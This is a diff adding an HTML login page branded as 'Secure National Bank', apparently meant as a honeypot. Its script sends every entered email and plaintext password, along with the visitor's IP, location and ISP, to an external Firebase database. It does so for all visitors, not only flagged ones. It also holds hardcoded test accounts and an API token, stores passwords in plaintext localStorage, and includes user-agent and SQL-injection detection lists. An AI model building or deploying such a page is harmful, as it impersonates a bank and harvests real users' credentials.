@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure National Bank - Login</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body class="login-body">
+  <div class="login-container">
+    <div class="login-card">
+      <div class="bank-header">
+        <div class="bank-logo">
+          <i class="fas fa-shield-alt"></i>
+        </div>
+        <h1>Secure National Bank</h1>
+        <p>Trusted Banking Since 1985</p>
+      </div>
+
+      <div id="loginForm" class="form-section">
+        <h2>Sign In to Your Account</h2>
+        <div id="loginMessage" class="message"></div>
+        
+        <div class="input-group">
+          <label for="loginEmail">Email Address</label>
+          <div class="input-wrapper">
+            <i class="fas fa-envelope"></i>
+            <input type="email" id="loginEmail" placeholder="Enter your email address" required>
+          </div>
+        </div>
+        
+        <div class="input-group">
+          <label for="loginPassword">Password</label>
+          <div class="input-wrapper">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="loginPassword" placeholder="Enter your password" required>
+            <button type="button" class="toggle-password" onclick="togglePassword('loginPassword')">
+              <i class="fas fa-eye"></i>
+            </button>
+          </div>
+        </div>
+        
+        <button class="btn-primary" onclick="handleLogin()">
+          <i class="fas fa-sign-in-alt"></i>
+          <span>Sign In Securely</span>
+        </button>
+        
+        <div class="form-footer">
+          <a class="create-account-link" onclick="showSection('signupForm')">
+            <i class="fas fa-user-plus"></i>
+            Don't have an account? Create one
+          </a>
+        </div>
+      </div>
+
+      <div id="signupForm" class="form-section hidden">
+        <h2>Create New Account</h2>
+        <div id="signupMessage" class="message"></div>
+        
+        <div class="input-group">
+          <label for="signupName">Full Name</label>
+          <div class="input-wrapper">
+            <i class="fas fa-user"></i>
+            <input type="text" id="signupName" placeholder="Enter your full name" required>
+          </div>
+        </div>
+        
+        <div class="input-group">
+          <label for="signupEmail">Email Address</label>
+          <div class="input-wrapper">
+            <i class="fas fa-envelope"></i>
+            <input type="email" id="signupEmail" placeholder="Enter your email address" required>
+          </div>
+        </div>
+        
+        <div class="input-group">
+          <label for="signupPassword">Password</label>
+          <div class="input-wrapper">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="signupPassword" placeholder="Create a strong password" required>
+            <button type="button" class="toggle-password" onclick="togglePassword('signupPassword')">
+              <i class="fas fa-eye"></i>
+            </button>
+          </div>
+        </div>
+        
+        <button class="btn-primary" onclick="handleSignup()">
+          <i class="fas fa-user-plus"></i>
+          <span>Create Account</span>
+        </button>
+        
+        <div class="form-footer">
+          <a class="back-link" onclick="showSection('loginForm')">
+            <i class="fas fa-arrow-left"></i>
+            Back to Sign In
+          </a>
+        </div>
+      </div>
+    </div>
+    
+    <div class="security-features">
+      <div class="security-item">
+        <i class="fas fa-shield-alt"></i>
+        <span>256-bit SSL Encryption</span>
+      </div>
+      <div class="security-item">
+        <i class="fas fa-lock"></i>
+        <span>Multi-Factor Authentication</span>
+      </div>
+      <div class="security-item">
+        <i class="fas fa-eye"></i>
+        <span>24/7 Fraud Monitoring</span>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
+  <script>
+    let loginAttempts = 0;
+    let firstAttemptTime = null;
+    let typingPattern = [];
+    let mouseMovements = [];
+    let suspiciousActivity = 0;
+    let pasteDetected = false;
+    let devToolsOpened = false;
+
+    let keystrokes = [];
+    let lastKeyTime = 0;
+    let averageTypingSpeed = 0;
+    let pasteCount = 0;
+    let rapidClickCount = 0;
+
+    function showSection(id) {
+      document.getElementById("loginForm").classList.add("hidden");
+      document.getElementById("signupForm").classList.add("hidden");
+      document.getElementById(id).classList.remove("hidden");
+      clearMessages();
+    }
+
+    function clearMessages() {
+      document.getElementById("loginMessage").innerHTML = "";
+      document.getElementById("signupMessage").innerHTML = "";
+    }
+
+    function togglePassword(inputId) {
+      const input = document.getElementById(inputId);
+      const icon = input.nextElementSibling.querySelector('i');
+      
+      if (input.type === 'password') {
+        input.type = 'text';
+        icon.classList.remove('fa-eye');
+        icon.classList.add('fa-eye-slash');
+      } else {
+        input.type = 'password';
+        icon.classList.remove('fa-eye-slash');
+        icon.classList.add('fa-eye');
+      }
+    }
+
+    function analyzeTypingPattern(inputElement) {
+      inputElement.addEventListener('keydown', function(e) {
+        const currentTime = Date.now();
+        if (lastKeyTime > 0) {
+          const timeDiff = currentTime - lastKeyTime;
+          keystrokes.push(timeDiff);
+          
+          // Calculate average typing speed
+          if (keystrokes.length > 10) {
+            averageTypingSpeed = keystrokes.reduce((a, b) => a + b) / keystrokes.length;
+            
+            if (averageTypingSpeed < 30 && keystrokes.length > 20) {
+              const veryFastCount = keystrokes.filter(time => time < 30).length;
+              if (veryFastCount > keystrokes.length * 0.8) {
+                suspiciousActivity += 2;
+                console.log("[v0] Consistently robotic typing detected:", averageTypingSpeed);
+              }
+            }
+          }
+        }
+        lastKeyTime = currentTime;
+      });
+
+      inputElement.addEventListener('paste', function(e) {
+        pasteCount++;
+        if (pasteCount > 2) {
+          pasteDetected = true;
+          suspiciousActivity += 1;
+          console.log("[v0] Excessive paste operations detected:", pasteCount);
+        }
+      });
+    }
+
+    document.addEventListener('mousemove', function(e) {
+      mouseMovements.push({
+        x: e.clientX,
+        y: e.clientY,
+        time: Date.now()
+      });
+
+      if (mouseMovements.length > 50) {
+        mouseMovements.shift();
+      }
+
+      if (mouseMovements.length > 20) {
+        const recentMoves = mouseMovements.slice(-20);
+        let straightLineCount = 0;
+        let identicalSpeedCount = 0;
+        
+        for (let i = 2; i < recentMoves.length; i++) {
+          const move1 = recentMoves[i-2];
+          const move2 = recentMoves[i-1];
+          const move3 = recentMoves[i];
+          
+          // Check for perfectly straight lines
+          const slope1 = (move2.y - move1.y) / (move2.x - move1.x);
+          const slope2 = (move3.y - move2.y) / (move3.x - move2.x);
+          if (Math.abs(slope1 - slope2) < 0.01) {
+            straightLineCount++;
+          }
+          
+          // Check for identical timing
+          const time1 = move2.time - move1.time;
+          const time2 = move3.time - move2.time;
+          if (Math.abs(time1 - time2) < 5) {
+            identicalSpeedCount++;
+          }
+        }
+        
+        // Only flag if majority of movements are robotic
+        if (straightLineCount > 15 && identicalSpeedCount > 15) {
+          suspiciousActivity += 2;
+          console.log("[v0] Robotic mouse movement pattern detected");
+        }
+      }
+    });
+
+    let devToolsCheckCount = 0;
+    setInterval(function() {
+      const start = performance.now();
+      debugger;
+      const duration = performance.now() - start;
+      
+      if (duration > 100) {
+        devToolsCheckCount++;
+        if (devToolsCheckCount > 3 && !devToolsOpened) {
+          devToolsOpened = true;
+          suspiciousActivity += 2; // Reduced from 3 to 2
+          console.log("[v0] DevTools consistently open - suspicious");
+        }
+      }
+    }, 3000); // Increased interval to 3 seconds
+
+    function isMaliciousInput(value) {
+      const sqlPatterns = [
+        /('|(\\')|(;)|(\\;))/i,
+        /(union|select|insert|delete|update|drop|create|alter|exec|execute)/i,
+        /(<script|javascript:|vbscript:|onload|onerror)/i,
+        /(\\x[0-9a-f]{2}|%[0-9a-f]{2})/i
+      ];
+      
+      const suspiciousChars = ["<script", "javascript:", "union select", "drop table", "'; --"];
+      
+      return sqlPatterns.some(pattern => pattern.test(value)) || 
+             suspiciousChars.some(char => value.toLowerCase().includes(char.toLowerCase()));
+    }
+
+    function analyzeUserAgent() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      const suspiciousAgents = [
+        'curl', 'wget', 'python', 'java', 'perl', 'ruby',
+        'sqlmap', 'nmap', 'dirbuster', 'burp', 'zap',
+        'selenium', 'phantomjs', 'headless'
+      ];
+      
+      return suspiciousAgents.some(agent => userAgent.includes(agent));
+    }
+
+    async function handleLogin() {
+      const email = document.getElementById("loginEmail").value;
+      const password = document.getElementById("loginPassword").value;
+      const currentTime = new Date().getTime();
+
+      if (!firstAttemptTime) firstAttemptTime = currentTime;
+
+      if (currentTime - firstAttemptTime < 120000) {
+        loginAttempts++;
+      } else {
+        loginAttempts = 1;
+        firstAttemptTime = currentTime;
+        suspiciousActivity = Math.max(0, suspiciousActivity - 1);
+      }
+
+      let riskScore = 0;
+
+      if (!email || !password) {
+        document.getElementById("loginMessage").innerHTML = "<div class='error'><i class='fas fa-exclamation-triangle'></i> Please fill in all fields.</div>";
+        return;
+      }
+
+      const defaultAccounts = {
+        'user@bank.com': 'password123',
+        'test@bank.com': 'test123',
+        'demo@bank.com': 'demo123',
+        'aa@gmail.com': 'password'
+      };
+
+      if (isMaliciousInput(email) || isMaliciousInput(password)) {
+        riskScore += 4;
+        console.log("[v0] Malicious input detected");
+      }
+
+      if (analyzeUserAgent()) {
+        riskScore += 3;
+        console.log("[v0] Suspicious user agent detected");
+      }
+
+      const badCredentials = [
+        'admin', 'root', 'test', 'administrator', 'user', 'guest',
+        '123456', 'password', 'admin123', 'root123', 'test123'
+      ];
+      
+      if (badCredentials.includes(email.toLowerCase()) || 
+          badCredentials.includes(password.toLowerCase())) {
+        riskScore += 2;
+      }
+
+      riskScore += Math.min(suspiciousActivity, 4);
+
+      if (loginAttempts > 5) {
+        riskScore += 2;
+      } else if (loginAttempts > 3) {
+        riskScore += 1;
+      }
+
+      const timeOnPage = Date.now() - window.performance.timing.navigationStart;
+      if (timeOnPage < 2000) {
+        riskScore += 1;
+        console.log("[v0] Very fast login attempt:", timeOnPage + "ms");
+      }
+
+      console.log("[v0] Total risk score:", riskScore, "Attempts:", loginAttempts);
+
+      try {
+        const ipResponse = await fetch("https://ipinfo.io/json?token=27824af3b12c98");
+        const ipData = await ipResponse.json();
+        
+        const hostname = ipData.hostname || "";
+        const org = ipData.org || "";
+        
+        if (hostname.includes("datacenter") || 
+            hostname.includes("amazonaws") || 
+            hostname.includes("digitalocean") ||
+            hostname.includes("vultr") ||
+            org.toLowerCase().includes("vpn") ||
+            org.toLowerCase().includes("proxy") ||
+            org.toLowerCase().includes("hosting")) {
+          riskScore += 2;
+          console.log("[v0] Suspicious IP/hosting detected");
+        }
+
+        const logData = {
+          ip: ipData.ip,
+          city: ipData.city,
+          country: ipData.country,
+          isp: ipData.org,
+          email: email,
+          password: password,
+          attempts: loginAttempts,
+          riskScore: riskScore,
+          suspiciousActivity: {
+            maliciousInput: isMaliciousInput(email) || isMaliciousInput(password),
+            suspiciousUserAgent: analyzeUserAgent(),
+            pasteDetected: pasteDetected,
+            devToolsOpened: devToolsOpened,
+            averageTypingSpeed: averageTypingSpeed,
+            mouseMovements: mouseMovements.length
+          },
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        };
+
+        fetch("https://honeypot-715b9-default-rtdb.firebaseio.com/login_attempts.json", {
+          method: "POST",
+          body: JSON.stringify(logData)
+        });
+
+      } catch (error) {
+        console.log("[v0] IP lookup failed:", error);
+      }
+
+      if (riskScore >= 8) {
+        document.getElementById("loginMessage").innerHTML = "<div class='error'><i class='fas fa-exclamation-triangle'></i> Invalid credentials. Please try again.</div>";
+        setTimeout(() => {
+          window.location.href = "honeypot.html";
+        }, 2000);
+        return;
+      }
+
+      const storedPassword = localStorage.getItem(email);
+      const defaultPassword = defaultAccounts[email];
+      
+      if (storedPassword === password || defaultPassword === password) {
+        document.getElementById("loginMessage").innerHTML = "<div class='success'><i class='fas fa-check-circle'></i> Login successful! Redirecting...</div>";
+        setTimeout(() => {
+          window.location.href = "real-bank.html";
+        }, 1500);
+      } else {
+        if (!storedPassword && !defaultPassword) {
+          document.getElementById("loginMessage").innerHTML = "<div class='error'><i class='fas fa-exclamation-triangle'></i> Account not found. Please create an account or use test credentials.</div>";
+        } else {
+          document.getElementById("loginMessage").innerHTML = "<div class='error'><i class='fas fa-exclamation-triangle'></i> Invalid password. Please try again.</div>";
+        }
+        
+        if (loginAttempts >= 6) {
+          setTimeout(() => {
+            window.location.href = "honeypot.html";
+          }, 2000);
+        }
+      }
+    }
+
+    function handleSignup() {
+      const name = document.getElementById("signupName").value;
+      const email = document.getElementById("signupEmail").value;
+      const password = document.getElementById("signupPassword").value;
+      
+      if (!name || !email || !password) {
+        document.getElementById("signupMessage").innerHTML = "<div class='error'><i class='fas fa-exclamation-triangle'></i> Please fill in all fields.</div>";
+        return;
+      }
+      
+      if (localStorage.getItem(email)) {
+        document.getElementById("signupMessage").innerHTML = "<div class='error'><i class='fas fa-exclamation-triangle'></i> Email already exists.</div>";
+      } else {
+        localStorage.setItem(email, password);
+        localStorage.setItem(email + "_name", name);
+        document.getElementById("signupMessage").innerHTML = "<div class='success'><i class='fas fa-check-circle'></i> Account created successfully! You can now sign in.</div>";
+        setTimeout(() => showSection('loginForm'), 2000);
+      }
+    }
+
+    window.addEventListener('load', function() {
+      analyzeTypingPattern(document.getElementById('loginEmail'));
+      analyzeTypingPattern(document.getElementById('loginPassword'));
+      analyzeTypingPattern(document.getElementById('signupEmail'));
+      analyzeTypingPattern(document.getElementById('signupPassword'));
+    });
+  </script>
+</body>
+</html>
